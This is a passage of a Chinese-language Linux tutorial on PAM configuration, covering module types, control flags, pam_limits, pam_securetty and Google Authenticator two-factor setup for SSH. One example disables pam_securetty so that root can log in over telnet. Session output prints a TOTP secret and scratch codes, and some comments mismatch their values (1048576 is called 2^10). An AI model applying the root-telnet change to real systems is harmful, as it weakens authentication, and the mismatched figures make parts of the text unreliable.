</ol>
</blockquote>
</div>
</div>
<div id="outline-container-h:af890347-5dcd-48f8-8376-8fe72690a9ea" class="outline-3">
<h3 id="h:af890347-5dcd-48f8-8376-8fe72690a9ea">PAM 配置文件格式说明</h3>
<div class="outline-text-3" id="text-h:af890347-5dcd-48f8-8376-8fe72690a9ea">
<p>
通用配置文件/etc/pam.conf格式
</p>

<div class="org-src-container">
<pre class="src src-sh">application type control module-path arguments
</pre>
</div>

<p>
专用配置文件/etc/pam.d/ 格式
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">type</span> control module-path arguments
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">application&#65306;&#25351;&#26381;&#21153;&#21517;&#65292;&#22914;&#65306;telnet&#12289;login&#12289;ftp&#31561;&#65292;&#26381;&#21153;&#21517;&#23383;&#8220;OTHER&#8221;&#20195;&#34920;&#25152;&#26377;&#27809;&#26377;&#22312;&#35813;&#25991;&#20214;&#20013;&#26126;&#30830;&#37197;&#32622;&#30340;&#20854;&#23427;&#26381;&#21153;
<span style="color: #483d8b;">type</span>       &#65306;&#25351;&#27169;&#22359;&#31867;&#22411;&#65292;&#21363;&#21151;&#33021;
control    &#65306;PAM&#24211;&#35813;&#22914;&#20309;&#22788;&#29702;&#19982;&#35813;&#26381;&#21153;&#30456;&#20851;&#30340;PAM&#27169;&#22359;&#30340;&#25104;&#21151;&#25110;&#22833;&#36133;&#24773;&#20917;&#65292;&#19968;&#20010;&#20851;&#20581;&#35789;&#23454;&#29616;
module-path&#65306; &#29992;&#26469;&#25351;&#26126;&#26412;&#27169;&#22359;&#23545;&#24212;&#30340;&#31243;&#24207;&#25991;&#20214;&#30340;&#36335;&#24452;&#21517;
Arguments  &#65306; &#29992;&#26469;&#20256;&#36882;&#32473;&#35813;&#27169;&#22359;&#30340;&#21442;&#25968;
</pre>
</div>

<p>
<b>模块类型（module-type）</b>
</p>

<ul class="org-ul">
<li>Auth 账号的认证和授权</li>
<li>Account 帐户的有效性，与账号管理相关的非认证类的功能，如：用来限制/允
许用户对某个服务的访问时间，限制用户的位置(例如：root用户只能从控制
台登录)</li>
<li>Password 用户修改密码时密码复杂度检查机制等功能</li>
<li>Session 用户会话期间的控制，如：最多打开的文件数，最多的进程数等</li>
<li>-type 表示因为缺失而不能加载的模块将不记录到系统日志,对于那些不总是安
装在系统上的模块有用</li>
</ul>

<p>
<b>Control:</b>
</p>

<p>
同一种功能的多个检查之间如何进行组合
</p>

<p>
两种实现机制：
</p>

<ol class="org-ol">
<li>简单实现：使用一个关键词来定义</li>
<li>详细实现：使用一个或多个“status=action”</li>
</ol>

<p>
简单实现：
</p>

<ol class="org-ol">
<li>required：一票否决，表示本模块必须返回成功才能通过认证，但是如果该
模块返回失败，失败结果也不会立即通知用户，而是要等到同一type中的所
有模块全部执行完毕再将失败结果返回给应用程序，即为必要条件（给面子）</li>

<li>requisite：一票否决，该模块必须返回成功才能通过认证，但是一旦该模块
返回失败，将不再执行同一type内的任何模块，而是直接将控制权返回给应
用程序。是一个必要条件（不给面子）</li>

<li>sufficient：一票通过，表明本模块返回成功则通过身份认证的要求，不必
再执行同一type内的其它模块，但如果本模块返回失败可忽略，即为充分条
件，优先于前面的required和requisite（相当于老板，一锤定音）</li>

<li>optional：表明本模块是可选的，它的成功与否不会对身份认证起关键作用，
其返回值一般被忽略

<ul class="org-ul">
<li>include： 调用其他的配置文件中定义的配置信息</li>

<li><p>
substack: 与include类似
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">cat passwd</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">%PAM-1.0</span>
auth       include  system-auth
account    include  system-auth
password   substack system-auth
-password   optional    pam_gnome_keyring.so use_authtok
password   substack postlogin
</pre>
</div></li>
</ul></li>
</ol>

<p>
详细实现：
</p>

<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #a0522d;">status1</span>=action1, <span style="color: #a0522d;">status2</span>=action2, ...]
status&#65306;&#36820;&#22238;&#29366;&#24577;
    success, open_err, symbol_err, service_err, system_err, buf_err, perm_denied, auth_err, cred_insufficient, authinfo_unavail, user_unknown, maxtries, new_authtok_reqd, acct_expired, session_err, cred_unavail, cred_expired, cred_err, no_module_data, conv_err, authtok_err, authtok_recover_err, authtok_lock_busy, authtok_disable_aging, try_again, ignore, abort, authtok_expired, module_unknown, bad_item, conv_again, incomplete, and default.

action&#65306;&#37319;&#21462;&#30340;&#34892;&#20026;&#65292;&#27604;&#22914;ok, done, die, bad, ignore, ...
    ok: &#27169;&#22359;&#36807;&#20102;&#65292;&#32487;&#32493;&#26597;
    <span style="color: #a020f0;">done</span>: &#19968;&#31080;&#36890;&#36807;&#65292;&#30456;&#24403;&#20110;sufficient
    bad&#65306;&#22833;&#36133;&#32487;&#32493;&#26816;&#26597;&#65292;&#30456;&#24403;&#20110;required
    die: &#19968;&#31080;&#21542;&#20915;&#65292;&#30456;&#24403;requisite
    ignore: &#24573;&#30053;
    reset: &#37325;&#26032;&#26816;&#26597;
&#22914;
auth [<span style="color: #a0522d;">user_unknown</span>=ignore <span style="color: #a0522d;">success</span>=ok <span style="color: #a0522d;">ignore</span>=ignore <span style="color: #a0522d;">default</span>=bad] pam_securetty.so
</pre>
</div>


<figure id="org492b3db">
<img src="images/image-20210413153724276.png" alt="image-20210413153724276.png" width="50%">

</figure>

<p>
<b>module-path:</b>
</p>

<ul class="org-ul">
<li>模块文件所在绝对路径：</li>
<li>模块文件所在相对路径：/lib64/security目录下的模块可使用相对路径，如：pam_shells.so、pam_limits.so</li>
<li>有些模块有自已的专有配置文件，在/etc/security/*.conf目 录下</li>
</ul>

<p>
<b>Arguments</b>
</p>

<ul class="org-ul">
<li>debug ：该模块应当用syslog( )将调试信息写入到系统日志文件中</li>
<li>no_warn ：表明该模块不应把警告信息发送给应用程序</li>
<li>use_first_pass：该模块不能提示用户输入密码，只能从前一个模块得到输入
密码</li>
<li>try_first_pass：该模块首先用前一个模块从用户得到密码，如果该密码验证
不通过，再提示用户输入新密码</li>
<li>use_mapped_pass：该模块不能提示用户输入密码，而是使用映射过的密码</li>
<li>expose_account：允许该模块显示用户的帐号名等信息，一般只能在安全的环
境下使用，因为泄漏用户名会对安全造成一定程度的威胁</li>
</ul>

<p>
注意：修改PAM配置文件将马上生效
</p>

<p>
<b>建议：编辑pam规则时，保持至少打开一个root会话，以防止root身份验证错误</b>
</p>
</div>
</div>
<div id="outline-container-h:2e34cfca-c49a-413e-9744-fc7234735926" class="outline-3">
<h3 id="h:2e34cfca-c49a-413e-9744-fc7234735926">PAM模块帮助</h3>
<div class="outline-text-3" id="text-h:2e34cfca-c49a-413e-9744-fc7234735926">
<p>
官方在线文档：<a href="http://www.linux-pam.org/Linux-PAM-html/">http://www.linux-pam.org/Linux-PAM-html/</a>
</p>

<p>
官方离线文档：<a href="http://www.linux-pam.org/documentation/">http://www.linux-pam.org/documentation/</a>
</p>

<p>
pam模块文档说明：/user/share/doc/pam-*
</p>

<pre class="example" id="orgb9275ae">
rpm -qd pam

man --k pam_

man 模块名 如：man 8 rootok
</pre>
</div>
</div>
<div id="outline-container-h:ea670f28-c7a7-4621-8b05-1b058c35b672" class="outline-3">
<h3 id="h:ea670f28-c7a7-4621-8b05-1b058c35b672">常用PAM模块</h3>
<div class="outline-text-3" id="text-h:ea670f28-c7a7-4621-8b05-1b058c35b672">
</div>
<div id="outline-container-h:9fc0359a-1d60-46a2-b335-3c0df2619d34" class="outline-4">
<h4 id="h:9fc0359a-1d60-46a2-b335-3c0df2619d34"><code>pam_shells</code> 模块</h4>
<div class="outline-text-4" id="text-h:9fc0359a-1d60-46a2-b335-3c0df2619d34">
<p>
功能：检查有效shell
</p>

<p>
帮助：man pam_shells
</p>

<p>
案例：不允许使用/bin/csh的用户本地登录
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#yum -y install csh
[root@centos8 ~]#vim /etc/pam.d/login
auth required pam_shells.so

[root@centos8 ~]#vim /etc/shells
&#21435;&#25481; /bin/csh

[root@centos8 ~]#useradd &#8211;s /bin/csh testuser

<span style="color: #b22222;">#</span><span style="color: #b22222;">testuser&#23558;&#19981;&#21487;&#30331;&#24405;</span>
[root@centos8 ~]#tail /var/log/secure
</pre>
</div>
</div>
</div>
<div id="outline-container-h:8db42eec-a319-41bc-be2d-3dccbd62337f" class="outline-4">
<h4 id="h:8db42eec-a319-41bc-be2d-3dccbd62337f"><code>pam_securetty.so</code> 模块</h4>
<div class="outline-text-4" id="text-h:8db42eec-a319-41bc-be2d-3dccbd62337f">
<p>
功能：只允许root用户在/etc/securetty列出的安全终端上登陆
</p>

<p>
范例：CentOS7 允许root在telnet登陆
</p>

<p>
注意： <b>CentOS8没有调用此模块，所以默认允许root远程登录telnet</b>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#36828;&#31243;&#30331;&#24405;&#26102;&#32456;&#31471;&#31867;&#22411;&#37117;&#26159;pts&#30340;&#65292;/etc/securetty&#20013;&#27809;&#26377;pts&#31867;&#22411;</span>

vi /etc/pam.d/remote <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36828;&#31243;&#30331;&#24405;pam&#27169;&#22359;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#19979;&#38754;&#19968;&#34892;&#21152;&#19978;&#27880;&#37322;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">auth required pam_securetty.so</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25110;&#32773;/etc/securetty&#25991;&#20214;&#20013;&#21152;&#20837;</span>
pts/0,pts/1&#8230;pts/n

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27979;&#35797;&#29992;root telnet&#30331;&#24405;</span>
</pre>
</div>

<p>
范例：在CentOS8上实现pam_securetty.so模块禁止root远程登录telnet服务
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#40664;&#35748;CentOS8 &#20801;&#35768;root&#36828;&#31243;telnet&#30331;&#24405;</span>
[root@centos7 ~]#telnet 10.0.0.8
Escape character is <span style="color: #8b2252;">'^]'</span>.

Kernel 4.18.0-147.el8.x86_64 on an x86_64
centos8 login: root
Password:
Last login: Mon May 25 11:51:08 from 10.0.0.1
[root@centos8 ~]#

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20462;&#25913;&#37197;&#32622;&#19981;&#20801;&#35768;root&#36828;&#31243;telnet&#30331;&#24405;</span>
[root@centos8 ~]#vim /etc/pam.d/remote
<span style="color: #b22222;">#</span><span style="color: #b22222;">%PAM-1.0</span>
auth required pam_securetty.so
[root@centos7 ~]#scp /etc/securetty 10.0.0.8:/etc

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#27979;&#35797;</span>
[root@centos7 ~]#telnet 10.0.0.8
Escape character is <span style="color: #8b2252;">'^]'</span>.

Kernel 4.18.0-147.el8.x86_64 on an x86_64
centos8 login: wang
Password:
Last login: Mon May 25 12:06:21 from ::ffff:10.0.0.6
[wang@centos8 ~]$<span style="color: #a0522d;">exit</span>
<span style="color: #a020f0;">logout</span>
Connection closed by foreign host.
[root@centos7 ~]#telnet 10.0.0.8
Escape character is <span style="color: #8b2252;">'^]'</span>.

Kernel 4.18.0-147.el8.x86_64 on an x86_64
centos8 login: root
Password:
Login incorrect

centos8 login:
</pre>
</div>
</div>
</div>
<div id="outline-container-h:8ad8c396-efaf-4b36-86a9-6f406a8c9685" class="outline-4">
<h4 id="h:8ad8c396-efaf-4b36-86a9-6f406a8c9685"><code>pam_nologin.so</code> 模块</h4>
<div class="outline-text-4" id="text-h:8ad8c396-efaf-4b36-86a9-6f406a8c9685">
<p>
功能：如果/etc/nologin文件存在,将导致非root用户不能登陆,当该用户登陆时，
会显示/etc/nologin文件内容，并拒绝登陆
</p>
</div>
</div>
<div id="outline-container-h:f21d7f5a-9400-4ede-b15f-10f3311ca447" class="outline-4">
<h4 id="h:f21d7f5a-9400-4ede-b15f-10f3311ca447"><code>pam_limits.so</code> 模块</h4>
<div class="outline-text-4" id="text-h:f21d7f5a-9400-4ede-b15f-10f3311ca447">
<p>
功能：在用户级别实现对其可使用的资源的限制，例如：可打开的文件数量，可
运行的进程数量，可用内存空间
</p>


<figure id="org3486453">
<img src="images/image-20210120200637139.png" alt="image-20210120200637139.png" width="50%">

</figure>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">选项 [options]</th>
<th scope="col" class="org-left">含义</th>
<th scope="col" class="org-left">例子</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">-H</td>
<td class="org-left">设置硬资源限制，一旦设置不能增加。</td>
<td class="org-left">ulimit &#x2013; Hs 64；限制硬资源，线程栈大小为 64K。</td>
</tr>

<tr>
<td class="org-left">-S</td>
<td class="org-left">设置软资源限制，设置后可以增加，但是不能超过硬资源设置。</td>
<td class="org-left">ulimit &#x2013; Sn 32；限制软资源，32 个文件描述符。</td>
</tr>

<tr>
<td class="org-left">-a</td>
<td class="org-left">显示当前所有的 limit 信息。</td>
<td class="org-left">ulimit &#x2013; a；显示当前所有的 limit 信息。</td>
</tr>

<tr>
<td class="org-left">-c</td>
<td class="org-left">最大的 core 文件的大小， 以 blocks 为单位。</td>
<td class="org-left">ulimit &#x2013; c unlimited； 对生成的 core 文件的大小不进行限制。</td>
</tr>

<tr>
<td class="org-left">-d</td>
<td class="org-left">进程最大的数据段的大小，以 Kbytes 为单位。</td>
<td class="org-left">ulimit -d unlimited；对进程的数据段大小不进行限制。</td>
</tr>

<tr>
<td class="org-left">-f</td>
<td class="org-left">进程可以创建文件的最大值，以 blocks 为单位。</td>
<td class="org-left">ulimit &#x2013; f 2048；限制进程可以创建的最大文件大小为 2048 blocks。</td>
</tr>

<tr>
<td class="org-left">-l</td>
<td class="org-left">最大可加锁内存大小，以 Kbytes 为单位。</td>
<td class="org-left">ulimit &#x2013; l 32；限制最大可加锁内存大小为 32 Kbytes。</td>
</tr>

<tr>
<td class="org-left">-m</td>
<td class="org-left">最大内存大小，以 Kbytes 为单位。</td>
<td class="org-left">ulimit &#x2013; m unlimited；对最大内存不进行限制。</td>
</tr>

<tr>
<td class="org-left">-n</td>
<td class="org-left">可以打开最大文件描述符的数量。</td>
<td class="org-left">ulimit &#x2013; n 128；限制最大可以使用 128 个文件描述符。</td>
</tr>

<tr>
<td class="org-left">-p</td>
<td class="org-left">管道缓冲区的大小，以 Kbytes 为单位。</td>
<td class="org-left">ulimit &#x2013; p 512；限制管道缓冲区的大小为 512 Kbytes。</td>
</tr>

<tr>
<td class="org-left">-s</td>
<td class="org-left">线程栈大小，以 Kbytes 为单位。</td>
<td class="org-left">ulimit &#x2013; s 512；限制线程栈的大小为 512 Kbytes。</td>
</tr>

<tr>
<td class="org-left">-t</td>
<td class="org-left">最大的 CPU 占用时间，以秒为单位。</td>
<td class="org-left">ulimit &#x2013; t unlimited；对最大的 CPU 占用时间不进行限制。</td>
</tr>

<tr>
<td class="org-left">-u</td>
<td class="org-left">用户最大可用的进程数。</td>
<td class="org-left">ulimit &#x2013; u 64；限制用户最多可以使用 64 个进程。</td>
</tr>

<tr>
<td class="org-left">-v</td>
<td class="org-left">进程最大可用的虚拟内存，以 Kbytes 为单位。</td>
<td class="org-left">ulimit &#x2013; v 200000；限制最大可用的虚拟内存为 200000 Kbytes。</td>
</tr>
</tbody>
</table>

<p>
修改限制的实现方式：
</p>

<p>
(1) ulimit命令，立即生效，但无法保存
</p>

<div class="org-src-container">
<pre class="src src-sh">-n &#27599;&#20010;&#36827;&#31243;&#26368;&#22810;&#30340;&#25171;&#24320;&#30340;&#25991;&#20214;&#25551;&#36848;&#31526;&#20010;&#25968;
-u &#26368;&#22823;&#29992;&#25143;&#36827;&#31243;&#25968;
-S &#20351;&#29992; soft&#65288;&#36719;&#65289;&#36164;&#28304;&#38480;&#21046;
-H &#20351;&#29992; hard&#65288;&#30828;&#65289;&#36164;&#28304;&#38480;&#21046;

<span style="color: #483d8b;">ulimit</span> -HSn 65535  <span style="color: #b22222;">#  </span><span style="color: #b22222;">&#35774;&#23450;&#27599;&#20010;&#36827;&#31243;&#26368;&#22823;&#25991;&#20214;&#25551;&#36848;&#31526;&#30340;&#25968;&#37327;</span>
</pre>
</div>

<p>
(2) 配置文件：
</p>

<div class="org-src-container">
<pre class="src src-sh">/etc/security/limits.conf &#65288;&#31435;&#21363;&#29983;&#25928;&#65289;
/etc/security/limits.d/*.conf (&#31435;&#21363;&#29983;&#25928;)
</pre>
</div>

<p>
配置文件格式：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#27599;&#34892;&#19968;&#20010;&#23450;&#20041;</span>
&lt;domain&gt; &lt;type&gt; &lt;item&gt; &lt;value&gt;
</pre>
</div>

<p>
格式说明：
</p>

<p>
应用于哪些对象
</p>

<pre class="example" id="orge3b4a26">
#&lt;domain&gt;：应用于哪些对象
Username 单个用户
@group 组内所有用户
* 所有用户
% 仅用于限制 maxlogins limit , 可以使用 %group 语法. 只用 % 相当于 * 对所有用户
maxsyslogins limit限制. %group 表示限制此组中的所有用户总的最大登录数
</pre>

<p>
限制的类型
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&lt;type&gt;&#65306;&#38480;&#21046;&#30340;&#31867;&#22411;</span>
Soft&#65306;&#36719;&#38480;&#21046;,&#26222;&#36890;&#29992;&#25143;&#33258;&#24049;&#21487;&#20197;&#20462;&#25913;
Hard&#65306;&#30828;&#38480;&#21046;,&#30001;root&#29992;&#25143;&#35774;&#23450;&#65292;&#19988;&#36890;&#36807;kernel&#24378;&#21046;&#29983;&#25928;
-   &#65306;&#36719;&#30828;&#20351;&#29992;&#30456;&#21516;&#38480;&#21046;&#65307;
</pre>
</div>

<p>
限制的资源
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&lt;item&gt;&#65306;&#38480;&#21046;&#30340;&#36164;&#28304;&#31867;&#22411;</span>
nofile &#25152;&#33021;&#22815;&#21516;&#26102;&#25171;&#24320;&#30340;&#26368;&#22823;&#25991;&#20214;&#25968;&#37327;,&#40664;&#35748;&#20026;1024
nproc &#25152;&#33021;&#22815;&#21516;&#26102;&#36816;&#34892;&#30340;&#36827;&#31243;&#30340;&#26368;&#22823;&#25968;&#37327;,&#40664;&#35748;&#20026;1024
</pre>
</div>

<p>
指定具体值
</p>

<p>
案例：系统的各种资源的默认值
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#ulimit -a
core file size          (blocks, -c) unlimited
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 7092
max locked memory       (kbytes, -l) 16384
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 7092
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
</pre>
</div>

<p>
案例：ulimit命令修改用户打开的文件个数，最多能打开2^10次方个文件
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#ulimit -n
1024
[root@centos8 ~]#ulimit -n 1048577
-bash: ulimit: open files: cannot modify limit: Operation not permitted
[root@centos8 ~]#ulimit -n 1048576  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26368;&#22810;&#33021;&#25171;&#24320;2^10&#27425;&#26041;&#20010;&#25991;&#20214;</span>
[root@centos8 ~]#ulimit -a
core file size          (blocks, -c) unlimited
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 7092
max locked memory       (kbytes, -l) 16384
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1048576
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 7092
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
[root@centos8 ~]#echo 2^20 |bc
1048576
</pre>
</div>

<p>
案例：限制用户最多打开的文件数和运行进程数，并持久保存
</p>

<div class="org-src-container">
<pre class="src src-sh">cat /etc/pam.d/system-auth
session     required    pam_limits.so

vim /etc/security/limits.conf
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;apache&#21487;&#25171;&#24320;10240&#20010;&#25991;&#20214;</span>
apache &#8211; nofile 10240
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;student&#19981;&#33021;&#36816;&#34892;&#36229;&#36807;20&#20010;&#36827;&#31243;</span>
student hard nproc 10

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;student&#30331;&#24405;&#22810;&#27425;&#36816;&#34892;bash&#65292;&#35266;&#23519;&#32467;&#26524;</span>

[root@centos8 ~]#vim /etc/security/limits.conf
wang        -       nofile 66666
wang        -       nproc 5
me        -       nofile 88888

[root@centos8 ~]#su - wang
Last login: Mon May 25 14:40:38 CST 2020 on pts/0
[wang@centos8 ~]$<span style="color: #a0522d;">ulimit</span> -n
66666
</pre>
</div>

<p>
案例：限制me用户最大的同时登录次数
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#tail -n1 /etc/security/limits.conf
me    -   maxlogins   2
[root@centos8 ~]#who
me    tty1    2020-05-25 14:35
root    pts/0   2020-05-25 14:35 (10.0.0.1)
root    pts/3   2020-05-25 14:06 (10.0.0.1)
me    tty3    2020-05-25 14:35
</pre>
</div>

<p>
生产案例:
</p>

<div class="org-src-container">
<pre class="src src-sh">vim /etc/security/limits.conf
*   -   core        unlimited
*   -   nproc       1000000
*   -   nofile      1000000
root   -   nofile      1000000
*   -   memlock     32000
*   -   msgqueue    8192000

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21482;&#23545;&#38750; root &#29992;&#25143;&#36215;&#20316;&#29992;&#12290;&#32780; root &#29992;&#25143;&#30340;&#38480;&#21046;&#65292;&#24517;&#39035;&#26174;&#24335;&#28155;&#21152;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:11bfdac4-0863-4209-8a31-f18f796e638b" class="outline-4">
<h4 id="h:11bfdac4-0863-4209-8a31-f18f796e638b"><code>pam_succeed_if</code> 模块</h4>
<div class="outline-text-4" id="text-h:11bfdac4-0863-4209-8a31-f18f796e638b">
<p>
功能：根据参数中的所有条件都满足才返回成功
</p>

<p>
案例：ubuntu默认不允许root登录桌面图形
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;root&#30331;&#24405;&#26700;&#38754;&#22833;&#36133;&#65292;&#26597;&#30475;&#26085;&#24535;&#65292;&#21487;&#30475;&#21040;Pam&#21407;&#22240;</span>

Vim /etc/pam.d/gdm-passwd
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#19979;&#38754;&#34892;&#27880;&#37322;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">auth requried pam_succeed_if.so user !=root quiet_success</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6e40e5e6-d416-4054-b270-9d0027461808" class="outline-4">
<h4 id="h:6e40e5e6-d416-4054-b270-9d0027461808"><code>pam_google_authenticator</code> 模块</h4>
<div class="outline-text-4" id="text-h:6e40e5e6-d416-4054-b270-9d0027461808">
<p>
功能：实现SSH登录的两次身份验证，先验证APP的数字码，再验证root用户的密
码，都通过才可以登录。目前只支持口令验证，不支持基于key验证
</p>

<p>
官方网站：<a href="https://github.com/google/google-authenticator-android">https://github.com/google/google-authenticator-android</a>
</p>


<p>
范例：
</p>

<ul class="org-ul">
<li>在手机应用市场搜索：身份验证器或authenticator，并安装APP或者也可以使用微信小程序MinaOTP</li>
<li>安装google-authenticator，需要有epel源</li>
<li>执行google-authenticator</li>
<li>在/etc/pam.d/sshd中添加auth required pam_google_authenticator.so</li>
<li>修改sshd配置文件/etc/ssh/sshd_config中
ChallengeResponseAuthentication yes</li>
<li>重启ssh服务</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#dnf info google-authenticator
Name         : google-authenticator

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;&#65292;&#38656;&#20808;&#23433;&#35013;epel&#28304;</span>
[root@centos8 ~]#yum install -y epel-release
[root@centos8 ~]#yum install -y  google-authenticator.x86_64

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#25191;&#34892;&#65292;&#25152;&#26377;&#36873;&#39033;&#37117;&#25191;&#34892;y</span>
[root@centos8 ~]#google-authenticator 
Do you want authentication tokens to be time-based (y/n) y
Warning: pasting the following URL into your browser exposes the OTP secret to Google:
</pre>
</div>

<p>
访问生成的url(需要科学上网):
</p>

<pre class="example" id="org2177538">
https://www.google.com/chart?
chs=200x200&amp;chld=M|0&amp;cht=qr&amp;chl=otpauth://totp/root@centos8.localdomain%3Fsecret%3D7YTAL4GW3TND7BICUMJGJLIFVE%26issuer%3Dcentos8.localdomain
</pre>


<figure id="orgf9fbab7">
<img src="images/image-20210120200839771.png" alt="image-20210120200839771.png" width="20%">

</figure>

<p>
打开用身份验证器APP，扫网页上的二维码，进行绑定手机
</p>


<figure id="org78fb587">
<img src="images/image-20210120200903716.png" alt="image-20210120200903716.png" width="20%">

</figure>

<p>
继续上面的安装配置向导，输入手机APP上的数字，后续都回答 y 即可
</p>

<div class="org-src-container">
<pre class="src src-sh">Failed to use libqrencode to show QR code visually for scanning.
Consider typing the OTP secret into your app manually.
Your new secret key is: LLFWOV6CYA5Z3LRIOFGKIQVREQ
Enter code from app (-1 to skip): 955339  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25163;&#26426;APP&#19978;&#30340;&#25968;&#23383;</span>
Code confirmed
Your emergency scratch codes are:
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#19979;&#38754;&#29983;&#25104;&#30340;&#25968;&#23383;&#38656;&#35201;&#20445;&#23384;&#65292;&#20197;&#38450;&#27490;&#25163;&#26426;&#20002;&#22833;&#26080;&#27861;&#30331;&#24405;&#26102;&#20351;&#29992;&#65292;&#37027;&#20010;&#20351;&#29992;&#36807;&#21518;&#23601;&#28040;&#22833;&#20102;</span>
&#38656;&#35201;&#28155;&#21152;&#30340;&#35805;&#21487;&#20197;&#22312;/root/.google_authenticator&#25991;&#20214;&#20013;&#28155;&#21152;
  48958542
  44641379
  74831968
  24770818
  95685545

Do you want me to update your <span style="color: #8b2252;">"/root/.google_authenticator"</span> file? (y/n) y

Do you want to disallow multiple uses of the same authentication
token? This restricts you to one login about every 30s, but it increases
your chances to notice or even prevent man-in-the-middle attacks (y/n) y

By default, a new token is generated every 30 seconds by the mobile app.
In order to compensate for possible time-skew between the client and the server,
we allow an extra token before and after the current time. This allows for a
<span style="color: #a020f0;">time</span> skew of up to 30 seconds between authentication server and client. If you
experience problems with poor time synchronization, you can increase the window
from its default size of 3 permitted codes (one previous code, the current
code, the next code) to 17 permitted codes (the 8 previous codes, the current
code, and the 8 next codes)<span style="color: #483d8b;">.</span> This will permit for a time skew of up to 4 minutes
between client and server.
Do you want to<span style="color: #a020f0;"> do</span> so? (y/n) y

If the computer that you are logging into isn<span style="color: #8b2252;">'t hardened against brute-force</span>
<span style="color: #8b2252;">login attempts, you can enable rate-limiting for the authentication module.</span>
<span style="color: #8b2252;">By default, this limits attackers to no more than 3 login attempts every 30s.</span>
<span style="color: #8b2252;">Do you want to enable rate-limiting? (y/n) y</span>

<span style="color: #8b2252;">#&#22312;pam&#37197;&#32622;&#25991;&#20214;sshd&#25991;&#20214;&#20013;&#28155;&#21152;&#27169;&#22359;</span>
<span style="color: #8b2252;">[root@centos8 ~]#vim /etc/pam.d/sshd </span>
<span style="color: #8b2252;">auth       required     pam_google_authenticator.so           </span>

<span style="color: #8b2252;">#&#20462;&#25913;ssh&#26381;&#21153;&#37197;&#32622;&#25991;&#20214;</span>
<span style="color: #8b2252;">[root@centos8 ~]#vim /etc/ssh/sshd_config </span>
<span style="color: #8b2252;">ChallengeResponseAuthentication yes</span>

<span style="color: #8b2252;">#&#37325;&#21551;ssh&#26381;&#21153;</span>
<span style="color: #8b2252;">[root@centos8 ~]#systemctl restart sshd</span>
</pre>
</div>

<p>
ssh当前主机，可看到提示，输入手机APP上显示的数字码和root密码，可以登录，
否则失败
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@Centos7 ~]#ssh 10.0.0.8
Verification code: 
Password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue May 26 17:28:13 2020 from 10.0.0.1
</pre>
</div>

<p>
临时口令存放在/root/.google_authenticator中，用一次删除一个，可手动加入使用
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat .google_authenticator 
LLFWOV6CYA5Z3LRIOFGKIQVREQ
<span style="color: #8b2252;">" RATE_LIMIT 3 30 1590486032</span>
<span style="color: #8b2252;">"</span> WINDOW_SIZE 17
<span style="color: #8b2252;">" DISALLOW_REUSE 53016201</span>
<span style="color: #8b2252;">"</span> TOTP_AUTH
48958542
44641379
74831968
24770818
95685545
</pre>
</div>

<p>
范例：安装配置脚本
</p>

<div class="org-src-container">
<pre class="src src-sh">cat google-authenticator.sh
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;epel</span>
yum install -y epel-release.noarch
yum makecache
